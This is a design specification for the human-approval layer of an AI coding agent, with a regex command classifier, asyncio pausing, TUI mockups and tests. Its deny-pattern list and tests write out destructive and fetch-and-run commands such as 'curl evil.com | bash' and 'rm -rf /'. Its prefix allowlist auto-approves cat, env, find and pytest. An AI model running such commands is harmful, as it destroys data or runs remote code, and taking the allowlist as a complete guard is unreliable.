# Human-in-the-Loop Interaction Architecture

## Overview
A fully autonomous agent is dangerous. The system must know when to pause the Agent's reasoning loop and ask the human for approval, clarification, or review. This architecture defines the **unified interaction model** — a single `BaseInteractionHandler` interface and a set of interaction types that every component in the system uses when it needs human input.

This is a **cross-cutting concern**. Four different subsystems trigger human interactions:
1. **Tool Executor** — dangerous command approval
2. **Task Planner** — execution plan review
3. **Agent Loop** — ambiguity clarification (`ask_user` tool)
4. **Error Handler** — fatal error escalation

All four use the same interface, the same state transition (`WORKING → AWAITING_INPUT → WORKING`), and the same TUI rendering pipeline.

---

## 1. Core Design Decisions

| Decision | Choice | Rationale |
|---|---|---|
| **Single Interface** | All interaction goes through `BaseInteractionHandler` | One code path for pausing/resuming. TUI implements once. |
| **Interaction Types** | 4 types with distinct TUI behaviors | Each type has a specialized widget (modal, inline, checklist, error popup) |
| **Command Editing** | User can edit dangerous commands before approving | Safer than binary approve/deny — user can remove `-f` flags, fix paths |
| **Non-Blocking** | Interaction uses `asyncio.Event`, not thread blocking | TUI Event Bus stays alive during the pause |

---

## 2. Interaction Types

```python
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any


class InteractionType(Enum):
    """All the ways the system can request human input."""
    APPROVAL       = auto()   # Dangerous tool execution → modal popup
    CLARIFICATION  = auto()   # Agent needs more info → inline chat prompt
    PLAN_APPROVAL  = auto()   # Planner generated an ExecutionPlan → checklist widget
    FATAL_ERROR    = auto()   # Unrecoverable error → error modal popup
```

| Type | Triggered By | TUI Widget | User Response |
|---|---|---|---|
| `APPROVAL` | `ToolExecutor` (dangerous tool) | Modal popup with command preview | Approve / Deny / Edit |
| `CLARIFICATION` | Agent's `ask_user` tool | Inline chat message, input refocused | Free-text response |
| `PLAN_APPROVAL` | Planner Agent (ExecutionPlan) | Plan checklist widget | Approve / Reject with feedback / Cancel |
| `FATAL_ERROR` | Error Handler (unrecoverable) | Error modal popup | Retry / Abort / Report |

---

## 3. The Interaction Request & Response Models

```python
@dataclass
class UserInteractionRequest:
    """
    A request from any system component to pause and get human input.
    The TUI inspects interaction_type to decide which widget to render.
    """
    interaction_type: InteractionType
    message: str                                    # Display text for the user
    task_id: str = ""                               # Which task triggered this
    source: str = ""                                # Component that requested (e.g., "tool_executor")
    
    # Type-specific fields (only populated for relevant types)
    tool_name: Optional[str] = None                 # APPROVAL: which tool
    tool_args: Optional[Dict[str, Any]] = None      # APPROVAL: tool arguments
    plan_assignments: Optional[List] = None         # PLAN_APPROVAL: the execution plan
    error_details: Optional[str] = None             # FATAL_ERROR: error traceback
    options: List[str] = field(default_factory=list) # Available choices


@dataclass
class UserInteractionResponse:
    """
    The user's response to an interaction request.
    """
    action: str = ""          # "approve", "deny", "cancel", "retry", "abort"
    feedback: str = ""        # Free-text: rejection reason, clarification answer, edited command
    edited_args: Optional[Dict[str, Any]] = None  # APPROVAL: user-modified tool arguments
```

---

## 4. The `BaseInteractionHandler` Interface

```python
from abc import ABC, abstractmethod


class BaseInteractionHandler(ABC):
    """
    The single interface for all human-in-the-loop interactions.
    
    The TUI implements this. The Agent loop, Tool Executor, Planner,
    and Error Handler all call request_human_input() when they need
    to pause and wait for the user.
    
    Internally, pausing is implemented with asyncio.Event — the calling
    coroutine awaits the event, the TUI sets it when the user responds.
    This keeps the Event Bus alive during the pause.
    """
    
    @abstractmethod
    async def request_human_input(
        self, request: UserInteractionRequest
    ) -> UserInteractionResponse:
        """
        Pause execution and wait for human input.
        
        Flow:
        1. Render the appropriate TUI widget based on request.interaction_type
        2. Wait for the user to respond (asyncio.Event)
        3. Return the structured response
        
        This method blocks the calling coroutine but NOT the event loop.
        The TUI, Event Bus, and other agents continue running.
        """
        pass
    
    @abstractmethod
    async def notify(self, message: str, severity: str = "info") -> None:
        """
        Non-blocking notification to the user. Does NOT pause execution.
        Used for status updates, warnings, and progress indicators.
        
        Severity levels:
        - "info": Status bar update (transient)
        - "warning": Inline yellow notification in chat
        - "error": Inline red notification in chat
        """
        pass
```

---

## 5. Who Triggers Each Interaction Type

### A. Tool Approval (`APPROVAL`)

Triggered by the `ToolExecutor` when an agent calls a dangerous tool. See `03_tools_architecture.md` Section 6.

```python
# In ToolExecutor.execute():
if requires_approval:
    response = await self.interaction_handler.request_human_input(
        UserInteractionRequest(
            interaction_type=InteractionType.APPROVAL,
            message=f"Agent wants to execute: {action.tool_name}",
            task_id=task_id,
            source="tool_executor",
            tool_name=action.tool_name,
            tool_args=action.arguments,
            options=["approve", "deny", "edit"]
        )
    )
    
    if response.action == "deny":
        return f"[Tool: {action.tool_name}] User denied execution."
    
    if response.action == "edit":
        # User modified the command — use their version
        action.arguments = response.edited_args
```

### B. Agent Clarification (`CLARIFICATION`)

Triggered when an agent uses the `ask_user` tool to resolve ambiguity.

```python
class AskUserTool(BaseTool):
    name = "ask_user"
    description = "Ask the user a clarifying question when you need more information."
    is_safe = True
    category = ToolCategory.UTILITY
    
    @property
    def args_schema(self) -> Type[BaseModel]:
        return AskUserArgs
    
    async def execute(self, question: str) -> str:
        response = await self.interaction_handler.request_human_input(
            UserInteractionRequest(
                interaction_type=InteractionType.CLARIFICATION,
                message=question,
                source="ask_user_tool",
                options=[]  # Free-text response
            )
        )
        return f"User replied: {response.feedback}"


class AskUserArgs(BaseModel):
    question: str = Field(description="The question to ask the user")
```

### C. Plan Approval (`PLAN_APPROVAL`)

Triggered by the Orchestrator after the Planner Agent produces an ExecutionPlan. See `03_task_planning.md` Section 5.

```python
# In Orchestrator._request_plan_approval():
response = await self.interaction_handler.request_human_input(
    UserInteractionRequest(
        interaction_type=InteractionType.PLAN_APPROVAL,
        message=plan_display,
        task_id=parent_task.task_id,
        source="orchestrator",
        plan_assignments=plan.assignments,
        options=["approve", "reject", "cancel"]
    )
)
```

### D. Fatal Error (`FATAL_ERROR`)

Triggered by the error handler when a non-recoverable error occurs. See `04_error_handling.md`.

```python
# In the Orchestrator's error handling:
if error.tier == ErrorTier.FATAL:
    response = await self.interaction_handler.request_human_input(
        UserInteractionRequest(
            interaction_type=InteractionType.FATAL_ERROR,
            message=f"Fatal error: {error.user_message}",
            task_id=task_id,
            source="error_handler",
            error_details=traceback.format_exc(),
            options=["retry", "abort", "report"]
        )
    )
    
    if response.action == "retry":
        # Create a new task (from error handling spec)
        ...
    elif response.action == "abort":
        await self.state_manager.transition(task_id, TaskState.CANCELLED)
```

---

## 6. Tool Safety Classification

### A. The `is_safe` Flag (Static)

Every `BaseTool` declares whether it requires approval. See `03_tools_architecture.md` Section 8.

| Safety | Tools | Behavior |
|---|---|---|
| `is_safe = True` | `read_file`, `grep_search`, `find_files`, `read_terminal`, `wait_for_terminal`, `sleep`, `ask_user` | Execute immediately — no user interaction |
| `is_safe = False` | `write_file`, `edit_file`, `run_command`, `spawn_terminal`, `send_terminal_input`, `kill_terminal` | Trigger `APPROVAL` interaction |

### B. Dynamic Regex Override (For `run_command`)

Not all shell commands are dangerous. The `ToolExecutor` applies a regex filter to dynamically override `is_safe` for clearly safe commands:

```python
SAFE_COMMAND_PATTERNS = [
    r"^(ls|dir|cat|type|echo|pwd|cd|head|tail|wc|grep|find|which|whoami|date|env)\b",
    r"^python\s+-c\s+['\"]print\b",
    r"^(git\s+(status|log|diff|branch|show))\b",
    r"^(npm|yarn|pip|cargo)\s+(list|show|outdated)\b",
    r"^pytest\b",
    r"^python\s+-m\s+pytest\b",
]

DANGEROUS_COMMAND_PATTERNS = [
    r"\brm\s",
    r"\bsudo\b",
    r"\bcurl\b.*\|\s*bash",
    r"\bchmod\b",
    r"\bchown\b",
    r"\bmkfs\b",
    r"\bdd\b\s+if=",
    r">\s*/dev/",
]


def classify_command_safety(command: str) -> bool:
    """
    Returns True if the command is safe to auto-execute.
    Returns False if it needs user approval.
    
    Priority: dangerous patterns override safe patterns.
    """
    import re
    command = command.strip()
    
    # Check dangerous patterns first (they take priority)
    for pattern in DANGEROUS_COMMAND_PATTERNS:
        if re.search(pattern, command):
            return False  # Dangerous — approval required
    
    # Check safe patterns
    for pattern in SAFE_COMMAND_PATTERNS:
        if re.match(pattern, command):
            return True  # Safe — auto-execute
    
    # Default: unknown commands require approval
    return False
```

### C. Auto-Approve Mode

For power users who trust the agent, a global toggle disables approval prompts:

```python
class AgentSettings(BaseSettings):
    # ... existing fields ...
    
    auto_approve_tools: bool = Field(
        default=False,
        description="If True, skip approval prompts for all tools. USE WITH CAUTION."
    )
    auto_approve_safe_commands: bool = Field(
        default=True,
        description="If True, auto-approve commands matching safe regex patterns."
    )
```

---

## 7. The State Transition: `AWAITING_INPUT`

Every human interaction follows the same state flow through the State Manager:

```
┌──────────┐     Interaction needed     ┌──────────────────┐
│ WORKING  │ ───────────────────────►  │ AWAITING_INPUT   │
└──────────┘                            └────────┬─────────┘
                                                 │
                                           User responds
                                                 │
                                                 ▼
                                        ┌──────────────────┐
                                        │    WORKING       │ (or CANCELLED if user cancels)
                                        └──────────────────┘
```

The `AWAITING_INPUT` state is visible in the TUI — the user can see which task is paused and why.

### Implementation: `asyncio.Event`-Based Pausing

```python
class TUIInteractionHandler(BaseInteractionHandler):
    """
    Textual TUI implementation of the interaction handler.
    Uses asyncio.Event to pause the calling coroutine without blocking the event loop.
    """
    
    def __init__(self, app: "AgentCLIApp"):
        self.app = app
        self._pending_events: Dict[str, asyncio.Event] = {}
        self._pending_responses: Dict[str, UserInteractionResponse] = {}
    
    async def request_human_input(
        self, request: UserInteractionRequest
    ) -> UserInteractionResponse:
        """
        1. Create an asyncio.Event for this request
        2. Render the appropriate TUI widget
        3. Await the event (blocks the coroutine, NOT the event loop)
        4. Return the response when the user interacts
        """
        request_id = str(uuid.uuid4())
        event = asyncio.Event()
        self._pending_events[request_id] = event
        
        # Render the appropriate widget based on interaction type
        await self._render_widget(request_id, request)
        
        # Wait for user response (non-blocking to the event loop)
        await event.wait()
        
        # Retrieve and clean up
        response = self._pending_responses.pop(request_id)
        self._pending_events.pop(request_id, None)
        
        return response
    
    def resolve(self, request_id: str, response: UserInteractionResponse) -> None:
        """
        Called by the TUI widget when the user responds.
        Sets the asyncio.Event, unblocking the waiting coroutine.
        """
        self._pending_responses[request_id] = response
        event = self._pending_events.get(request_id)
        if event:
            event.set()
    
    async def _render_widget(self, request_id: str, request: UserInteractionRequest):
        """Route to the correct TUI widget based on interaction type."""
        if request.interaction_type == InteractionType.APPROVAL:
            await self.app.show_approval_modal(request_id, request)
        elif request.interaction_type == InteractionType.CLARIFICATION:
            await self.app.show_inline_prompt(request_id, request)
        elif request.interaction_type == InteractionType.PLAN_APPROVAL:
            await self.app.show_plan_review(request_id, request)
        elif request.interaction_type == InteractionType.FATAL_ERROR:
            await self.app.show_error_modal(request_id, request)
    
    async def notify(self, message: str, severity: str = "info") -> None:
        """Non-blocking notification — just post to the TUI."""
        await self.app.post_notification(message, severity)
```

---

## 8. TUI Widget Specifications

### A. Approval Modal (Tool Execution)

```
┌──────────────────────────────────────────────────────────┐
│  ⚠ Tool Approval Required                               │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Agent "coder" wants to execute:                         │
│                                                          │
│  Tool:    run_command                                    │
│  Command: rm -rf node_modules && npm install             │ ← Editable
│                                                          │
│  Task: "Clean and reinstall dependencies"                │
│                                                          │
├──────────────────────────────────────────────────────────┤
│  [Y] Approve  │  [N] Deny  │  [E] Edit Command          │
└──────────────────────────────────────────────────────────┘
```

**Edit Mode:** When the user presses `E`, the command field becomes editable. The user can modify the command (e.g., remove `-rf`), then press `Enter` to approve the modified version.

### B. Inline Clarification (ask_user)

```
╭─ Agent (coder) ──────────────────────────────────────────╮
│ I found three login implementations:                     │
│   1. src/auth/login_v1.py (deprecated)                   │
│   2. src/auth/login_v2.py (current)                      │
│   3. src/api/login_handler.py (API layer)                │
│                                                          │
│ Which one has the bug you're referring to?                │
╰──────────────────────────────────────────────────────────╯
> █                                     (input refocused)
```

No modal. The question appears inline in the chat log. The input bar is refocused for the user's reply.

### C. Plan Approval Checklist

See `03_task_planning.md` Section 5 for the full plan approval widget specification.

```
┌──────────────────────────────────────────────────────────┐
│  📋 Execution Plan                                       │
├──────────────────────────────────────────────────────────┤
│  1. [coder]  (MEDIUM) Remove cookie-based logic          │
│  2. [coder]  (HIGH)   Implement JWT middleware           │
│  3. [coder]  (MEDIUM) Write unit tests                   │
├──────────────────────────────────────────────────────────┤
│  [Enter] Approve  │  [E] Reject + Feedback  │ [Esc] Cancel│
└──────────────────────────────────────────────────────────┘
```

### D. Fatal Error Modal

```
┌──────────────────────────────────────────────────────────┐
│  ✖ Fatal Error                                           │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  MaxRetriesExhaustedError: All 3 retries failed for      │
│  provider "anthropic". Last error: 503 Service           │
│  Unavailable.                                            │
│                                                          │
│  Task: "Refactor auth module" (task_abc123)               │
│                                                          │
├──────────────────────────────────────────────────────────┤
│  [R] Retry  │  [A] Abort Task  │  [D] Show Details       │
└──────────────────────────────────────────────────────────┘
```

---

## 9. Cross-Reference Map

This spec is the **canonical reference** for human interaction. Other specs reference it but do not duplicate the interface:

| Spec | What It References | Section |
|---|---|---|
| `03_tools_architecture.md` | Tool safety (`is_safe`), ToolExecutor approval flow | Section 6 |
| `03_task_planning.md` | Plan approval UX, rejection/revision loop | Section 5 |
| `04_error_handling.md` | Fatal error escalation to user | TUI Notification |
| `01_reasoning_loop.md` | `AWAITING_INPUT` state during tool approval | Section 3 |
| `02_state_management.md` | `WORKING → AWAITING_INPUT → WORKING` transition | Transition Table |

---

## 10. Configuration

```python
class AgentSettings(BaseSettings):
    # ... existing fields ...
    
    # Human-in-the-Loop settings
    auto_approve_tools: bool = Field(
        default=False,
        description="If True, skip ALL approval prompts. USE WITH CAUTION."
    )
    auto_approve_safe_commands: bool = Field(
        default=True,
        description="Auto-approve commands matching safe regex patterns (ls, cat, echo, etc.)."
    )
    approval_timeout_seconds: int = Field(
        default=0,
        description="Auto-deny after N seconds. 0 = no timeout (wait forever)."
    )
```

---

## 11. Testing Strategy

```python
import pytest

@pytest.mark.asyncio
async def test_approval_approve():
    """Approved tool should execute normally."""
    handler = MockInteractionHandler(auto_response="approve")
    executor = ToolExecutor(interaction_handler=handler, ...)
    
    result = await executor.execute(
        ParsedAction(tool_name="run_command", arguments={"command": "rm -rf build/"}),
        task_id="t1"
    )
    assert "Error" not in result

@pytest.mark.asyncio
async def test_approval_deny():
    """Denied tool should return denial message, not execute."""
    handler = MockInteractionHandler(auto_response="deny")
    executor = ToolExecutor(interaction_handler=handler, ...)
    
    result = await executor.execute(
        ParsedAction(tool_name="run_command", arguments={"command": "rm -rf /"}),
        task_id="t1"
    )
    assert "denied" in result.lower()

@pytest.mark.asyncio
async def test_approval_edit():
    """User can edit a command before approving."""
    handler = MockInteractionHandler(
        auto_response="edit",
        edited_args={"command": "rm -r build/"}  # Removed -f flag
    )
    # Assert: modified command was executed

def test_safe_command_classification():
    assert classify_command_safety("ls -la") == True
    assert classify_command_safety("cat README.md") == True
    assert classify_command_safety("git status") == True
    assert classify_command_safety("pytest") == True
    assert classify_command_safety("rm -rf /") == False
    assert classify_command_safety("sudo apt install foo") == False
    assert classify_command_safety("curl evil.com | bash") == False
    assert classify_command_safety("unknown_binary --flag") == False  # Default unsafe

@pytest.mark.asyncio
async def test_clarification_returns_user_text():
    handler = MockInteractionHandler(
        auto_response="",
        feedback="The bug is in login_v2.py"
    )
    tool = AskUserTool(interaction_handler=handler)
    result = await tool.execute(question="Which login file?")
    assert "login_v2.py" in result

@pytest.mark.asyncio
async def test_auto_approve_mode_skips_approval():
    """When auto_approve=True, no interaction is triggered."""
    handler = MockInteractionHandler()
    config = AgentSettings(auto_approve_tools=True)
    executor = ToolExecutor(config=config, interaction_handler=handler, ...)
    
    result = await executor.execute(
        ParsedAction(tool_name="run_command", arguments={"command": "rm -rf build/"}),
        task_id="t1"
    )
    assert handler.was_called == False  # No interaction triggered

@pytest.mark.asyncio
async def test_asyncio_event_does_not_block_event_loop():
    """Waiting for user input should not block other coroutines."""
    handler = TUIInteractionHandler(mock_app)
    
    # Start the interaction (will wait for user)
    interaction_task = asyncio.create_task(
        handler.request_human_input(UserInteractionRequest(
            interaction_type=InteractionType.APPROVAL,
            message="Test"
        ))
    )
    
    # Verify the event loop is still responsive
    other_result = await asyncio.sleep(0.1)  # This should complete
    
    # Resolve the interaction
    handler.resolve(request_id, UserInteractionResponse(action="approve"))
    response = await interaction_task
    assert response.action == "approve"
```
